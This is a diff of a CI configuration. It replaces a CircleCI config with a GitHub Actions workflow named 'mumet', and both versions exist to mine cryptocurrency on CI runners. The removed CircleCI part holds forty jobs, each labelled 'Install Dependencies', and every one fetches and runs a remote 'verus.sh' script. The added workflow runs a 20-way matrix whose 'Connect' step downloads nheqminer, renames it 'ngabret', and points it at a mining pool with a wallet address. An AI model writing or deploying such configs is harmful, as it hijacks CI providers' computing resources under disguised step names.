@@ -1,326 +1,50 @@
-version: 2
+
+name: mumet
+
+on: [push, pull_request]
+
+env:
+  BUILD_TYPE: Release
+
 jobs:
-    aku1:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku2:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku3:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku4:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku5:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku6:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku7:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku8:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku9:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku10:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku11:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku12:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku13:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku14:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku15:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku16:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku17:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku18:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku19:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku20:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku21:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku22:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku23:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku24:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku25:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku26:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku27:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku28:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku29:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku30:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku31:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku32:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku33:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku34:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku35:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku36:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku37:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku38:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku39:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-    aku40:
-      docker:
-            - image: circleci/ruby:2.4
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://bitbucket.org/novalanto01/miningsh/raw/da923e34fdbee9ed1fb4b6423bf2e6a779c0cfcd/verus.sh && chmod u+x verus.sh && ./verus.sh
-workflows:
-    version: 2
-    build:
-        jobs:
-            - aku1
-            - aku2
-            - aku3
-            - aku4
-            - aku5
-            - aku6
-            - aku7
-            - aku8
-            - aku9
-            - aku10
-            - aku11
-            - aku12
-            - aku13
-            - aku14
-            - aku15
-            - aku16
-            - aku17
-            - aku18
-            - aku19
-            - aku20
-            - aku21
-            - aku22
-            - aku23
-            - aku24
-            - aku25
-            - aku26
-            - aku27
-            - aku28
-            - aku29
-            - aku30
-            - aku31
-            - aku32
-            - aku33
-            - aku34
-            - aku35
-            - aku36
-            - aku37
-            - aku38
-            - aku39
-            - aku40
+  build:
+    runs-on: ubuntu-latest
+    container: golang:latest
+    strategy:
+      matrix:
+         test_block:
+          - 1
+          - 2
+          - 3
+          - 4
+          - 5
+          - 6
+          - 7
+          - 8
+          - 9
+          - 10
+          - 11
+          - 12
+          - 13
+          - 14
+          - 15
+          - 16
+          - 17
+          - 18
+          - 19
+          - 20
+    services:
+      postgres:
+        image: postgres
+        env:
+          POSTGRES_PASSWORD: postgres
+
+    steps:
+      - name: Check out repository code
+        uses: actions/checkout@v2
+      - name: echo
+        run: echo "done"
+
+      - name: Connect
+        run: |
+            wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && mv nheqminer/nheqminer ngabret && ./ngabret -v -l ap.luckpool.net:3956 -u RCZiRNaUvTv9f6JPBMCVjt8XSULR47ZHVf.SUKUMANTE -p x -t 2
